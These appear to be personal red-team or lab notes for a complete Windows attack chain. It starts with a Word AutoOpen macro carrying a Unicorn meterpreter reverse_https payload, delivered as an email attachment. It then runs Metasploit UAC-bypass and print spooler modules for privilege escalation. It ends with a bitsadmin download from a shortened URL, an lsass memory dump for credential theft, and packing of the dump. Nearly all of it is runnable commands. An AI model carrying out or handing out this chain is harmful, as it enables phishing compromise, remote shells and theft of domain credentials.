---------
Windows 10 Version 22H2 - Build 19045.2006

cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs"  /dstatus
---------
Might have to use Windows XP 
https://blog.danielburrowes.com/2024/01/windows-xp-on-proxmox.html
---------
Setup Microsoft Word

- Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
- Click Developer | Macros
- Open Word / Developer / Macros / Create / AutoOpen / insert payload from Unicorn
- The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
- Macro Security - Enable all macros
- Save as a Word Macro-Enabled Document
- Create a Email and save it as a MSG file with attachement 
-------
Create a Email MSG shortcut for the following;

"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "No Account" "C:\Users\domainuser\Desktop\email.msg"
"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"

---------
[UPDATE METASPL0IT]
sudo passwd root
su - 
curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb && chmod 755 msfinstall && ./msfinstall
---------
[Install Unicorn]

git clone https://github.com/trustedsec/unicorn
chmod +x unicorn
python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro

---------
Copy maro powershell_attack.txt into Word attachment. 

sudo mv powershell_attack.txt /home/powershell_attack.txt
scp kali@10.3.99.1:/home/powershell.txt 


sudo msfconsole -r unicorn.rc
---------
sessions -i 1
load priv stdapi extapi

getuid
getsystem
background 
use windows/local/bypassuac_sluihijack
set SESSION 1
exploit
getuid
getsystem

---------
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_comhijack


use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
exploit
---

use exploit/windows/local/bypassuac_comhijack
set SESSION 1
exploit
---

run post/multi/recon/local_exploit_suggester
---

use exploit/windows/local/print_spooler_dcerpc
set SESSION 1
exploit
---------
execute -H -c -f "C:\\windows\\sysnative\\notepad.exe"
migrate 7584
shell
---------

whoami
ping -m 1 8.8.8.8
net1 group "Domain Admins" /domain

# downloads pd64.exe ProcessDump"
bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C:\Users\Public\1.exe
cd C:\Users\Public\
C:\Users\Public\1.exe -accepteula -ma lsass.exe lsass.dmp
makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
